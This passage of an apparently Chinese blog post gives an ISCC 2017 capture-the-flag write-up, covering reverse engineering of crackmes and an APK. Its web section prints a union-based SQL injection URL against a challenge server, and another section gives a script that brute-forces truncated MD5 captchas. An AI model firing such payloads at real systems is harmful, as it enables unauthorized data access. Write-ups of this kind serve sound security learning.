+<p>关于验证码，ctf中经常用MD5的截断比较做验证，如:substr(md5(captcha), 0, 3)=’a85’,通过这种方式限制脚本的自动化攻击。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">@$demo=$_GET[<span class="string">'demo'</span>];</div><div class="line">$i=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line"><span class="keyword">if</span> (substr(md5($i), <span class="number">0</span>, <span class="number">3</span>)===$demo) </div><div class="line">	&#123;<span class="keyword">echo</span> $i;<span class="keyword">die</span>;&#125;</div><div class="line">$i++;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>python版本网上有的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import hashlib</div><div class="line">def md5(s):</div><div class="line">	return hashlib.md5(s).hexdigest()</div><div class="line">for i in range(1, 9999):</div><div class="line">	if md5(str(i)).startswith(&apos;a85&apos;):</div><div class="line">		print i</div></pre></td></tr></table></figure></p>
+<p>最后效果<br><img src="https://ooo.0o0.ooo/2017/05/23/592404186ed97.gif" alt="GIF.gif"></p>
+<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>这道题刚做出来就被下架了，分数清零。<br>题目本是反序列化的题目，但是可能是出题人头很铁.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://139.129.108.53:5555/index.php?select=0 and 1=2 union select flag from selct&amp;time=1</div></pre></td></tr></table></figure></p>
+<p>这样就可以解出来了。</p>
+<h2 id="Moblie"><a href="#Moblie" class="headerlink" title="Moblie"></a>Moblie</h2><h3 id="简单到不行"><a href="#简单到不行" class="headerlink" title="简单到不行"></a>简单到不行</h3><p><img src="http://i2.muimg.com/588926/46c9bbc14be5efc5.png" alt=""><br><a href="http://pan.baidu.com/s/1hs9mIaS" target="_blank" rel="external">附件链接</a>： 密码：hd1q</p>
+<p>这里使用 jeb 进行 APK 的反编译<br>直接将 APK 拖入窗口左边的工程栏目 , 就会自动进行反编译<br><img src="http://i4.buimg.com/588926/61b6efce329c7cea.png" alt=""><br>根据对代码的分析可以知道 , 这个安卓应用有两个控件 ：<br>一个 EditText 用于接收用户输入 , 另一个 Button 用于检验用户输入是否合法<br>继续往下看<br>发现应用要调用<code>JNI</code>层的函数 : checkFlag，再用IDA打开相关的so文件主要函数如下<br><img src="http://i2.muimg.com/588926/64b0256dcfee034d.png" alt=""><br>这里反编译成的 c 代码在有的地方似乎存在一点问题 , 如果发现某些地方比较诡异的话<br>再回去看看汇编基本上就可以明白了。而在这个checkFlag函数中，</p>
+<p>主要是将传入的字符串使用了 <code>malloc</code> 重新复制了一份<br>算法的意思是 :<br>将用户输入的字符串按照长度分割成两半<br>把前一半字符串中的字符按照从左到右的顺序取出来 , ASCII码减去 5 , 然后与后半个字符串与之对应的位置进行交换<br>举个例子 :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">用户输入的字符串 str = &quot;8793245632&quot;</div><div class="line">分成两半 :</div><div class="line">前一半为 : &quot;87932&quot;</div><div class="line">后一半为 : &quot;45632&quot;</div><div class="line">对前一半的所有字符 , 从左向右取 , 第一个取到的是 8 , ASCII - 5 , 变成字符 3 , 然后与后半个字符串的对应位置 (也就是 &apos;2&apos; ) 的位置进行交换</div><div class="line">那么这一次变换得到的结果就是 :</div><div class="line">str = &quot;279324563&quot;</div></pre></td></tr></table></figure></p>
+<p>那么这个算法总结一下的话 , 其实可以这样理解 :<br><code>首先将整个字符串倒序 , 然后将后半个字符串的每一个字符ASCII都减去 5</code><br>再往下看。处理完用户输入的字符串的时候 , 进行的操作是 :<br>将用户处理完的结果和程序中已经存在的一段数据逐字符进行对比 , 对比如果完全一致就返回 1 , 反之就 return 0</p>
+<p>从so文件中找到字符串为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=0HWYl1SE5UQWFfN?I+PEo.UcshU</div></pre></td></tr></table></figure></p>
+<p>那我们就是先将这个密文倒序再将前半部分的ASCII码全部加上5。<br>将得到的base64进行解密即可。<br><img src="https://ooo.0o0.ooo/2017/05/11/5914749e14a48.png" alt="1.png"></p>
+<h3 id="突破！征服"><a href="#突破！征服" class="headerlink" title="突破！征服!"></a>突破！征服!</h3><p><img src="http://i2.muimg.com/588926/8211544b8942b5f2.png" alt=""><br><a href="http://pan.baidu.com/s/1skMl41B" target="_blank" rel="external">附件链接</a>： 密码：7nx1</p>
+<p>flag：<code>6ae379eaf3ccada5</code></p>
+<h3 id="再来一次"><a href="#再来一次" class="headerlink" title="再来一次"></a>再来一次</h3><p><img src="https://ooo.0o0.ooo/2017/05/22/5923034d8868e.png" alt="1.png"><br><a href="http://pan.baidu.com/s/1slCsKrV" target="_blank" rel="external">附件链接</a>： 密码：20y5<br><img src="https://ooo.0o0.ooo/2017/05/24/59256f995bf41.png" alt="1.png"><br>flag{ISCCXiaoTianShi}</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="你猜"><a href="#你猜" class="headerlink" title="你猜"></a>你猜</h3><p><a href="http://pan.baidu.com/s/1pLHgjMj" target="_blank" rel="external">附件链接</a>： 密码：k3g0<br>一度怀疑我这个IDA是假的，显示的不是<code>main函数</code>。。。（后来问了逆向大兄弟，是因为在编译时去掉了符号表，在高版本自带的sig信号文件可以识别出）<br><img src="http://i4.buimg.com/588926/2b7f8eb4d3a0c6ae.png" alt=""><br>从main函数来看，这个程序出现了两个验证。</p>
+<h4 id="验证-I"><a href="#验证-I" class="headerlink" title="验证 I"></a>验证 I</h4><p><img src="http://i4.buimg.com/588926/0381e706044ec96b.png" alt=""><br>在IDA中，使用<code>R</code>能快速的将ASCII码转换成字符串，所以V5至V14依次为<code>l1nuxcrack</code><br>而根据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; i &lt;= 4; ++i )</div><div class="line">&#123;</div><div class="line">  if ( *(_BYTE *)(*(_QWORD *)(a1 + 8) + i) != *(&amp;v5 + i) )</div><div class="line">  &#123;</div><div class="line">    result = 1LL;</div><div class="line">    goto LABEL_12;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这是对<code>l1nux</code>的验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">for ( j = 0; j &lt;= 4; ++j )</div><div class="line">&#123;</div><div class="line">  if ( *(_BYTE *)(*(_QWORD *)(a1 + 16) + j) != *(&amp;v10 + j) )</div><div class="line">  &#123;</div><div class="line">    result = 1LL;</div><div class="line">    goto LABEL_12;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这是对<code>crack</code>的验证<br>所以这部分代码可以断定第一个和第二个字符串分别为<code>l1nux</code>和<code>crack</code></p>
+<h4 id="验证-II"><a href="#验证-II" class="headerlink" title="验证 II"></a>验证 II</h4><p>回过来对第二个验证分析，看一下函数<br><img src="http://i4.buimg.com/588926/f190f0a6f17ced41.png" alt=""><br>和前面分析过的函数差别不大，只是 ASCII 码的判断 , 进行简单的加减法就可以推算出第三个 password</p>
+<blockquote>
+<p>73,76,67,70,33==ILCF!</p>
+</blockquote>
+<p>flag{l1nux_crack_ILCF!}</p>
+<h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p><a href="http://pan.baidu.com/s/1i5geAFj" target="_blank" rel="external">附件链接</a>： 密码：9305<br>有点小幸运，直接看到了验证函数。再换算,将各个字符进行位置调整。<br><img src="http://i4.buimg.com/588926/1c916da4ed6c077b.png" alt=""><br>flag{1t.is.5O.easy}</p>
+<h3 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h3><p><a href="http://pan.baidu.com/s/1qXCKnJe" target="_blank" rel="external">附件链接</a>： 密码：7ugp<br>下载打开，是个EXE文件，估计着要脱壳。<br>运行提示<code>try again!</code>，扔进IDA。然后就没然后了，等小伙伴分析分析。<br>flag{thx_4_your_register}</p>
+<h3 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h3><p><a href="http://pan.baidu.com/s/1c2jCC4C" target="_blank" rel="external">附件链接</a>： 密码：bdgn<br>老套路IDA F5大法。<br><img src="http://i4.buimg.com/588926/aa2c430d08fab294.png" alt=""><br>先一句一句来看吧<br><code>s</code>给的空间住够大，104个字符。<br><code>fgets()函数</code>是读取文件字符串，<br><code>srand函数</code>是随机数发生器的初始化函数。原型：void srand(unsigned int seed);<br>在C语言中中，<code>unsigned int</code>类型数据所占字节数跟和机器字长及编译器有关系。<br>这<code>main函数</code>主要是读取用户输入，类型转换作为随机数序列的种子，两次自定义的encode函数，最后输出encode结果。</p>
+<h4 id="encode1"><a href="#encode1" class="headerlink" title="encode1"></a>encode1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">size_t __fastcall sub_400796(const char *a1)</div><div class="line">&#123;</div><div class="line">  size_t result; // rax@11</div><div class="line">  signed int i; // [sp+18h] [bp-18h]@1</div><div class="line">  signed int k; // [sp+18h] [bp-18h]@7</div><div class="line">  signed int j; // [sp+1Ch] [bp-14h]@2</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 25; ++i )</div><div class="line">  &#123;</div><div class="line">    for ( j = 0; j &lt;= 25; ++j )</div><div class="line">      *(&amp;byte_6010C0[26 * i] + j) = (i + j) % 26 + 97;</div><div class="line">  &#125;</div><div class="line">  for ( k = 0; ; ++k )</div><div class="line">  &#123;</div><div class="line">    result = strlen(a1);</div><div class="line">    if ( k &gt;= result )</div><div class="line">      break;</div><div class="line">    if ( (*__ctype_b_loc())[a1[k]] &amp; 0x200 )</div><div class="line">      a1[k] = *(&amp;byte_6010C0[26 * ((a1[k] - 97) % 26)] + (byte_601070[(signed __int64)(k % 26)] - 97) % 26);</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>byte_6010C0的内容为空。<br><img src="http://i1.piimg.com/588926/17573547a25189b6.png" alt=""><br>byte_601070的内容为<code>qwertyuiopaasdfghjklzxcvbnm</code><br><img src="http://i1.piimg.com/588926/375c2016f855a3ad.png" alt=""><br>而第一个for生成了一个表，第二个for是表对应位置加上一个数。</p>
+<h4 id="encode2"><a href="#encode2" class="headerlink" title="encode2"></a>encode2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall sub_400937(const char *a1)</div><div class="line">&#123;</div><div class="line">  int v1; // eax@7</div><div class="line">  int v2; // ebx@8</div><div class="line">  char v4; // [sp+1Bh] [bp-F5h]@3</div><div class="line">  signed int i; // [sp+1Ch] [bp-F4h]@1</div><div class="line">  int j; // [sp+20h] [bp-F0h]@2</div><div class="line">  int v7; // [sp+24h] [bp-ECh]@1</div><div class="line">  unsigned int v8; // [sp+28h] [bp-E8h]@1</div><div class="line">  int v9; // [sp+2Ch] [bp-E4h]@1</div><div class="line">  char src[200]; // [sp+30h] [bp-E0h]@7</div><div class="line">  __int64 v11; // [sp+F8h] [bp-18h]@1</div><div class="line"></div><div class="line">  v11 = *MK_FP(__FS__, 40LL);</div><div class="line">  v7 = 0;</div><div class="line">  v8 = rand() % 7 + 2;</div><div class="line">  v9 = strlen(a1) / (signed int)v8 + 1;</div><div class="line">  for ( i = 0; i &lt; (signed int)v8; ++i )</div><div class="line">  &#123;</div><div class="line">    for ( j = 0; j &lt; v9; ++j )</div><div class="line">    &#123;</div><div class="line">      v4 = a1[v8 * j + i];</div><div class="line">      if ( (*__ctype_b_loc())[v4] &amp; 0x200 || v4 == 123 || v4 == 125 || v4 == 95 )</div><div class="line">      &#123;</div><div class="line">        v1 = v7++;</div><div class="line">        src[v1] = v4;</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">        v2 = v7++;</div><div class="line">        src[v2] = rand() % 26 + 97;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  src[v7] = 0;</div><div class="line">  strcpy((char *)a1, src);</div><div class="line">  return *MK_FP(__FS__, 40LL) ^ v11;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个就不懂了。队友做。</p>
+<p><a href="http://pan.baidu.com/s/1gfEECtP" target="_blank" rel="external">exp地址链接 </a>密码：6v9j</p>
+<p>flag{decrypt_game_is_very_very_interesting}</p>
+<p>做<code>Reverse</code>最大的感受就是：当初怎么没把<code>C语言</code>给学好呢。</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p><a href="http://pan.baidu.com/s/1i4PPDAX" target="_blank" rel="external">附件链接</a>： 密码：of1u<br><a href="http://pan.baidu.com/s/1hsabgUg" target="_blank" rel="external">exp链接</a>： 密码：blfw<br><img src="https://ooo.0o0.ooo/2017/05/15/59197bc6376dc.png" alt="Capture.PNG"></p>
+<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><a href="http://pan.baidu.com/s/1jHDCyGI" target="_blank" rel="external">附件链接</a>： 密码：cgvp<br><a href="http://pan.baidu.com/s/1o7IoxlC" target="_blank" rel="external">exp链接</a>： 密码：z8xb<br>flag{SF#PWN2Hd93DxnsE}</p>
+<h2 id="没有过程的不打算补了，好废时间。"><a href="#没有过程的不打算补了，好废时间。" class="headerlink" title="没有过程的不打算补了，好废时间。"></a>没有过程的不打算补了，好废时间。</h2><h2 id="没有misc400的wp都不是好wp。"><a href="#没有misc400的wp都不是好wp。" class="headerlink" title="没有misc400的wp都不是好wp。"></a>没有misc400的wp都不是好wp。</h2>
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>！坚持技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://ooo.0o0.ooo/2017/04/12/58ee21687d335.png" alt="RcoIl WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      RcoIl
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://rcoil.me/2017/05/ISCC-2017/" title="ISCC 2017 WriteUp">http://rcoil.me/2017/05/ISCC-2017/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag" aria-hidden="true"></i> Writeup</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/Pentest中需要注意的本地凭证/" rel="next" title="Pentest中需要注意的本地凭证">
+                <i class="fa fa-chevron-left"></i> Pentest中需要注意的本地凭证
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/PHP-定时任务/" rel="prev" title="PHP 定时任务">
+                PHP 定时任务 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODE5NS80NzY4"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="RcoIl" />
+          <p class="site-author-name" itemprop="name">RcoIl</p>
+           
+              <p class="site-description motion-element" itemprop="description">好吃懒做，还有就是皮肤比黄皮果还黄！</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/RcoIl" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rcoil@qq.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-fa fa-envelope-open"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn/" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://hacktech.cn/" title="Akkuman" target="_blank">Akkuman</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kerlinglovsec.lofter.com/" title="kerling" target="_blank">kerling</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.agteam.net/" title="Fire-ant" target="_blank">Fire-ant</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xnianq.cn/" title="xniang" target="_blank">xniang</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one/" title="nMask" target="_blank">nMask</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic"><span class="nav-number">1.</span> <span class="nav-text">Basic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Wheel-Cipher"><span class="nav-number">1.1.</span> <span class="nav-text">Wheel Cipher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神秘图片"><span class="nav-number">1.2.</span> <span class="nav-text">神秘图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#告诉你个秘密"><span class="nav-number">1.3.</span> <span class="nav-text">告诉你个秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#你猜猜。。"><span class="nav-number">1.4.</span> <span class="nav-text">你猜猜。。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二维码"><span class="nav-number">1.5.</span> <span class="nav-text">二维码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#说我作弊，需要证据"><span class="nav-number">1.6.</span> <span class="nav-text">说我作弊，需要证据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#公邮密码"><span class="nav-number">1.7.</span> <span class="nav-text">公邮密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-encrypt-1"><span class="nav-number">1.8.</span> <span class="nav-text">PHP_encrypt_1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#眼见非实"><span class="nav-number">2.1.</span> <span class="nav-text">眼见非实</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#就在其中"><span class="nav-number">2.2.</span> <span class="nav-text">就在其中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#很普通的Disco"><span class="nav-number">2.3.</span> <span class="nav-text">很普通的Disco</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#很普通的数独"><span class="nav-number">2.4.</span> <span class="nav-text">很普通的数独</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再见李华"><span class="nav-number">2.5.</span> <span class="nav-text">再见李华</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻”文”启事"><span class="nav-number">2.6.</span> <span class="nav-text">寻”文”启事</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WelcomeToMySQL"><span class="nav-number">3.1.</span> <span class="nav-text">WelcomeToMySQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自相矛盾"><span class="nav-number">3.2.</span> <span class="nav-text">自相矛盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I-have-a-jpg-i-upload-a-txt"><span class="nav-number">3.3.</span> <span class="nav-text">I have a jpg,i upload a txt.</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#上传部分。"><span class="nav-number">3.3.1.</span> <span class="nav-text">上传部分。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rename部分"><span class="nav-number">3.3.2.</span> <span class="nav-text">rename部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web签到题，来和我换flag啊！"><span class="nav-number">3.4.</span> <span class="nav-text">Web签到题，来和我换flag啊！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#我们一起来日站"><span class="nav-number">3.5.</span> <span class="nav-text">我们一起来日站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-is-your-flag"><span class="nav-number">3.6.</span> <span class="nav-text">where is your flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-sqli"><span class="nav-number">3.7.</span> <span class="nav-text">Simple sqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#select"><span class="nav-number">3.8.</span> <span class="nav-text">select</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Moblie"><span class="nav-number">4.</span> <span class="nav-text">Moblie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单到不行"><span class="nav-number">4.1.</span> <span class="nav-text">简单到不行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#突破！征服"><span class="nav-number">4.2.</span> <span class="nav-text">突破！征服!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再来一次"><span class="nav-number">4.3.</span> <span class="nav-text">再来一次</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#你猜"><span class="nav-number">5.1.</span> <span class="nav-text">你猜</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#验证-I"><span class="nav-number">5.1.1.</span> <span class="nav-text">验证 I</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#验证-II"><span class="nav-number">5.1.2.</span> <span class="nav-text">验证 II</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小试牛刀"><span class="nav-number">5.2.</span> <span class="nav-text">小试牛刀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#大杂烩"><span class="nav-number">5.3.</span> <span class="nav-text">大杂烩</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#顺藤摸瓜"><span class="nav-number">5.4.</span> <span class="nav-text">顺藤摸瓜</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#encode1"><span class="nav-number">5.4.1.</span> <span class="nav-text">encode1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#encode2"><span class="nav-number">5.4.2.</span> <span class="nav-text">encode2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">6.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn1"><span class="nav-number">6.1.</span> <span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn2"><span class="nav-number">6.2.</span> <span class="nav-text">pwn2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没有过程的不打算补了，好废时间。"><span class="nav-number">7.</span> <span class="nav-text">没有过程的不打算补了，好废时间。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没有misc400的wp都不是好wp。"><span class="nav-number">8.</span> <span class="nav-text">没有misc400的wp都不是好wp。</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+<!--
+    <i class="fa fa-heart"></i>
+-->
+	<i class="fa fa-address-card-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RcoIl</span>
+</div>
+<!--
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+<div class="busuanzi-count">
